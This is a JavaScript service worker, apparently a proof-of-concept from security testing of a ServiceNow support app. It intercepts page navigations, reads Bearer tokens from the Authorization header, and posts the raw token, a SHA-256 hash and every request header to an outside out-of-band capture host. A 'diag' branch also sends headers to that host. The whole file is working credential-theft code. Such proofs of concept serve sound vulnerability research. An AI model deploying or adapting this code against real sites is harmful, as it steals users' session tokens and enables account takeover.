'use strict';

const OAST_BASE = 'https://erfqqzdagbcinnxaylnh2h036s9jiqe6u.oast.fun';

self.addEventListener('install', event => {
  event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', event => {
  event.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', event => {
  if (event.request.mode !== 'navigate') {
    return;
  }

  const url = new URL(event.request.url);
  const captureBase = url.searchParams.get('oast') || OAST_BASE;
  const marker = url.searchParams.get('marker') || 'no-marker';
  const authorization = event.request.headers.get('authorization') || '';
  const headersSeen = {};
  for (const [key, value] of event.request.headers.entries()) {
    headersSeen[key] = value;
  }

  if (authorization.startsWith('Bearer ')) {
    const token = authorization.slice(7);

    event.respondWith((async () => {
      const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(token))
        .then(buffer => Array.from(new Uint8Array(buffer), b => b.toString(16).padStart(2, '0')).join(''));

      const captureBody = JSON.stringify({
        event: 'capture',
        app: 'now_support',
        marker: marker,
        url: url.href,
        authorization_length: token.length,
        authorization_sha256: digest,
        headers_seen: headersSeen,
        authorization: token
      });

      event.waitUntil(
        fetch(captureBase + '/servicenow-now-support/' + encodeURIComponent(marker), {
          method: 'POST',
          mode: 'no-cors',
          credentials: 'omit',
          cache: 'no-store',
          keepalive: true,
          body: captureBody
        }).catch(() => undefined)
      );

      return new Response(
        '<!doctype html><meta charset="utf-8"><title>Captured</title>' +
        '<h1>Bearer captured</h1>' +
        '<p>Token length: ' + token.length + '</p>' +
        '<p>Token sha256: ' + digest.slice(0, 16) + '…</p>' +
        '<p>Raw token delivered to the capture endpoint only; not shown on screen.</p>' +
        '<p>Disposable accounts can now be deleted.</p>',
        {
          status: 200,
          headers: {
            'Content-Type': 'text/html; charset=utf-8',
            'Cache-Control': 'no-store'
          }
        }
      );
    })());
    return;
  }

  if (url.searchParams.has('diag')) {
    const diagBody = JSON.stringify({
      event: 'diag',
      app: 'now_support',
      marker: marker,
      url: url.href,
      has_authorization: false,
      headers_seen: headersSeen
    });
    event.waitUntil(
      fetch(captureBase + '/servicenow-now-support/diag', {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'omit',
        cache: 'no-store',
        keepalive: true,
        body: diagBody
      }).catch(() => undefined)
    );
  }
});
